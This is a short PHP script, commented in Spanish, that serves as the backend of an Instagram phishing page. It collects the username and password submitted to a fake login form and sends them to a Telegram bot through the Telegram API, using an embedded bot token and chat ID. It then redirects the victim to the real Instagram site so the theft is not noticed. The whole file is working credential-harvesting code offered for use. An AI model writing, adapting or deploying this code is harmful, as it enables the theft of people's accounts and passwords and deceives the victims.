<?php
// Configuración de Telegram
$token = "8761245881:AAEzL6BhOe0K2zi9tov80NXR0v9XcpsYRcU";
$chat_id = "5773870334"; // Reemplazá esto por tu ID de userinfobot

// Captura los datos del formulario de Instagram
$username = $_POST['username'];
$password = $_POST['password'];

// Arma el mensaje que te va a llegar al celular
$message = "📩 ¡Nuevo Registro de Instagram!\n\n";
$message .= "👤 Usuario: " . $username . "\n";
$message .= "🔑 Contraseña: " . $password . "\n";

// Envía los datos a Telegram usando la API
$url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($message);
file_get_contents($url);

// Redirige al usuario a la página oficial de Instagram
header("Location: https://instagram.com");
exit();
?>
